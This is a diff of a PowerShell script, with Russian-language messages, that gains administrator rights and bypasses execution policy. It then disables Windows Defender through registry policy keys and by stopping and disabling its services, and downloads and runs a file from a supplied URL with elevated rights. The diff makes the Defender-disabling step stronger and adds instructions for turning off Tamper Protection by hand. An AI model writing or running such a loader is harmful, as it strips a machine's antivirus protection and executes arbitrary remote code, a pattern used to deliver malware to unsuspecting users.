@@ -10,19 +10,16 @@ param(
 function Ensure-AdminRights {
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-   
     if (-not $isAdmin) {
         Write-Host "Запрашиваю повышение прав..." -ForegroundColor Yellow
         $scriptPath = $MyInvocation.MyCommand.Path
         $scriptArgs = "-Url `"$Url`""
         if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
         if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
-       
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = "powershell.exe"
         $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
         $psi.Verb = "runas"
-       
         try {
             [System.Diagnostics.Process]::Start($psi)
             exit
@@ -38,27 +35,44 @@ function Ensure-AdminRights {
 }
 
 function Disable-Defender {
-    Write-Host "Пытаюсь отключить антивирус Windows Defender..." -ForegroundColor Cyan
+    Write-Host "Пытаюсь отключить Windows Defender (службы и реестр)..." -ForegroundColor Cyan
     try {
-        Set-MpPreference -DisableRealtimeMonitoring $true
-        Set-MpPreference -DisableBehaviorMonitoring $true
-        Set-MpPreference -DisableBlockAtFirstSeen $true
-        Set-MpPreference -DisableIOAVProtection $true
-        Set-MpPreference -DisablePrivacyMode $true
-        Set-MpPreference -DisableScriptScanning $true
-        Write-Host "Антивирус Defender отключён." -ForegroundColor Green
+        # Отключаем через групповую политику (если доступно)
+        if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender") {
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+        } else {
+            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+        }
+        # Отключаем реальную защиту через реестр
+        $defenderKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
+        if (Test-Path $defenderKey) {
+            Set-ItemProperty -Path $defenderKey -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
+            Set-ItemProperty -Path $defenderKey -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
+            Set-ItemProperty -Path $defenderKey -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
+            Set-ItemProperty -Path $defenderKey -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
+        }
+        # Останавливаем службу WinDefend
+        Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
+        # Останавливаем связанные службы
+        Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
+        Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue
+        Stop-Service -Name "WdBoot" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "WdFilter" -Force -ErrorAction SilentlyContinue
+        
+        Write-Host "Defender отключён (требуется перезагрузка для полного применения)." -ForegroundColor Green
         return $true
     }
     catch {
         Write-Host "Не удалось отключить Defender: $_" -ForegroundColor Red
-        Write-Host "Возможно, включена Tamper Protection или используется другой антивирус." -ForegroundColor Yellow
+        Write-Host "Возможно, включена Tamper Protection. Отключите её вручную в Безопасность Windows -> Защита от вирусов -> Управление настройками -> Защита от несанкционированного доступа" -ForegroundColor Yellow
         return $false
     }
 }
 
 function Download-File {
     param([string]$url, [string]$destPath)
-   
     Write-Host "Скачиваю из $url ..." -ForegroundColor Cyan
     try {
         $webClient = New-Object System.Net.WebClient
@@ -74,12 +88,10 @@ function Download-File {
 
 function Run-AsAdmin {
     param([string]$filePath, [string]$arguments)
-   
     if (-not (Test-Path $filePath)) {
         Write-Host "Файл не найден: $filePath" -ForegroundColor Red
         return $false
     }
-   
     Write-Host "Запускаю от имени администратора: $filePath" -ForegroundColor Cyan
     try {
         $processArgs = @{
@@ -103,7 +115,7 @@ function Run-AsAdmin {
 try {
     Ensure-AdminRights
 
-    Write-Host "`nДля скачивания и запуска файла требуется отключить антивирус Windows Defender." -ForegroundColor Yellow
+    Write-Host "`nДля скачивания и запуска файла требуется отключить Windows Defender." -ForegroundColor Yellow
     $userChoice = Read-Host "Вы согласны отключить антивирус? (y/n)"
     if ($userChoice -ne 'y') {
         Write-Host "Отказ пользователя. Выход." -ForegroundColor Red
